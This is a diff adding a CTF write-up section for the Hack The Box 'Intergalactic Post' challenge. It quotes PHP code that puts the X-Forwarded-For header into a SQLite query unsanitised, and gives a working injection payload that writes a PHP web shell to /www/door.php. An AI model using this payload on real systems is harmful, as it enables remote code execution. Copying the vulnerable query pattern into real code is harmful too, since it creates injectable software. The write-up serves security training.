@@ -2,6 +2,8 @@
 
 A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.
 
+Each writeup include the given source file with a docker setup. I might've added few debuging outputs to the source files, which shouldn't impact the challenge itself.
+
 ------------
 
 - [Pwn](#pwn)
@@ -250,6 +252,102 @@ We end up with a final payload:
 <br/>
 
 4. <p name="web4">Intergalactic Post (★☆☆☆)</p>
+For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/)). We get the following home page:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web4.png'>
+</p>
+
+A simple page for email subscription, nothing more... We'll have to check the code for this one, we see that we got a PHP server. Checking the provided controllers, we can directly check the [/controllers/SubsController.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php) file. We mainly have 2 functionalities:
+
+```php
+    public function store($router)
+    {
+        $email = $_POST['email'];
+
+        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            header('Location: /?success=false&msg=Please submit a valild email address!');
+            exit;
+        }
+
+        $subscriber = new SubscriberModel;
+        $subscriber->subscribe($email);
+
+        header('Location: /?success=true&msg=Email subscribed successfully!');
+        exit;
+    }
+
+    public function logout($router)
+    {
+        session_destroy();
+        header('Location: /admin');
+        exit;
+    }
+```
+
+Let's focus on the subscription part, we see that our given email is validated using `filter_var($email, FILTER_VALIDATE_EMAIL)`, so as a start, we check PHP documentation ([ref](https://www.php.net/manual/en/function.filter-var.php)) but there is nothing interesting for now... 
+
+Moving on, we'll check our `SubscriberModel` class, located at [/models/SubscriberModel.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php)
+
+Now, we see some interesting code:
+
+```php
+    public function getSubscriberIP(){
+        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
+            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
+        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
+            return $_SERVER["REMOTE_ADDR"];
+        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
+            return $_SERVER["HTTP_CLIENT_IP"];
+        }
+        return '';
+    }
+
+    public function subscribe($email)
+    {
+        $ip_address = $this->getSubscriberIP();
+        return $this->database->subscribeUser($ip_address, $email);
+    }
+```
+
+We see that the `$ip_address` isn't validated, so that should be our attack vector? Checking the `getSubscriberIP()` method, it's basically extracting the IP from the request header, `X-Forwarded-For`, if included. And this will be our SQL injection, but what kind of database are we using?
+
+Checkig [/Database.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/Database.php), we see that we are using SQLite, we also confirm that the `subscribeUser` method is vulnerable to SQL Injection
+
+```php
+    public function subscribeUser($ip_address, $email)
+    {
+        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
+    }
+```
+
+And if you're not familliar with SQLite, it's a file based database, which means, we have the possibility to write files. This explains the change of NodeJS to a PHP app, we are in the correct path.
+
+We can basically create a new database file in a public path (`/www/`), insert a php code in it & when we visit it, it'll be executed.
+
+That's translated in SQL with this:
+
+```SQL
+attach '/www/door.php' as bd; 
+create table bd.rce(cc text); 
+insert into bd.rce values('<?php echo system($_GET["c"]); ?>');
+```
+
+Now, we'll inject this using our headers. We add a `X-Forwarded-For` to our subscription post request:
+
+```http
+X-Forwarded-For: hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f
+```
+
+which will result in the following query to be executed:
+
+```SQL
+INSERT INTO subscribers (ip_address, email) VALUES('hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f', 'myemail@hi.rce')
+```
+
+The `--` is used as a one line comment in SQL.
+
+And that, gives us a backdoor file at `/door.php`. We find the flag file & get it's content: `HTB{inj3ct3d_th3_tru7h}`
 
 5. <p name="web5">Acnologia Portal (★★☆☆)</p>
 
